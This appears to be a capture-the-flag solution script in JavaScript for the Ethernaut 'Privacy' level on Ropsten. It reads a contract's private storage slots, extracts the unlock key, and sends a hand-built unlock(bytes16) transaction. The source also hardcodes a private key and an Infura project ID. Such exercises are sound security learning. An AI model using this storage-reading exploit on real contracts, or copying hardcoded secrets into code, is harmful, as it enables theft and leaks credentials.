import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { debugEthernaut, debugError } from './config/debug';

const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
const web3 = new Web3(infuraProvider);
const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
const address = '0x12B7367f1358Ce72C72E30F6DB41c823FB28bA14';

// const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ElevatorSol.json')));
// const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Elevator.json')));
// const solAddress = solArtifact.networks['3'].address;
// debugEthernaut('solAddress', solAddress);
// const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
// const contract = new web3.eth.Contract(artifact.abi, address);

const ethernaut = async () => {
  try {
    const locked = await web3.eth.getStorageAt(address, 0);
    debugEthernaut('locked', locked);
    const id = await web3.eth.getStorageAt(address, 1);
    debugEthernaut('id', web3.utils.hexToNumber(id));
    let storage = await web3.eth.getStorageAt(address, 2);
    debugEthernaut('storage', storage);
    // flattening is a uint8 -> 1 byte -> 2 chars
    debugEthernaut('flattening', web3.utils.hexToNumber(`0x${storage.slice(-2)}`));
    // denomination is a uint8 -> 1 byte -> 2 chars
    debugEthernaut('denomination', web3.utils.hexToNumber(`0x${storage.slice(-4, -2)}`));
    // awkwardness is a uint16 -> 2 byte -> 4 chars, last 2 bytes (4 chars) from id
    debugEthernaut('awkwardness', web3.utils.hexToNumber(`0x${storage.slice(-8, -4)}`));
    debugEthernaut('awkwardnesss from id', web3.utils.hexToNumber(`0x${id.slice(-4)}`));
    // storage 3 is data[0], since the storage slots are 32 bytes length at much
    storage = await web3.eth.getStorageAt(address, 3);
    debugEthernaut('data[0]', storage);
    // storage 4 is data[1]
    storage = await web3.eth.getStorageAt(address, 4);
    debugEthernaut('data[1]', storage);
    // storage 5 is data[2], which is key
    storage = await web3.eth.getStorageAt(address, 5);
    debugEthernaut('data[2]', storage);
    // bytes16(data[2]), which is key
    const key = storage;
    debugEthernaut('bytes16(data[2])=>_key', key);
    const signature = (web3.utils.sha3('unlock(bytes16)')).slice(0, 10);
    debugEthernaut('function signature', signature);
    const dataValue = web3.utils.padLeft(key, 64);
    debugEthernaut('data value', dataValue);
    const data = signature + dataValue.replace('0x', '');
    debugEthernaut('data for transaction', data);
    const gasPrice = web3.utils.toWei('20', 'Gwei');
    const transaction = {
      from: account.address,
      to: address,
      data,
      gasLimit: 8 * 10 ** 6,
      gasPrice,
    };
    debugEthernaut('transaction', transaction);
    // const estimatedGas = await await solContract.methods.attack(0).estimateGas();
    // debugEthernaut('estimated gas', estimatedGas);
    // const data = await solContract.methods.attack(0).encodeABI();
    // debugEthernaut('data', data);

    // Sign transaction
    const signedTx = await account.signTransaction(transaction);
    debugEthernaut('signedTx:\n', signedTx);
    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    debugEthernaut('txResult:\n', txResult);

    // // Check result
    // const top = await contract.methods.top().call();
    // debugEthernaut('top', top);
  } catch (error) {
    debugError(error);
  }
};

ethernaut();
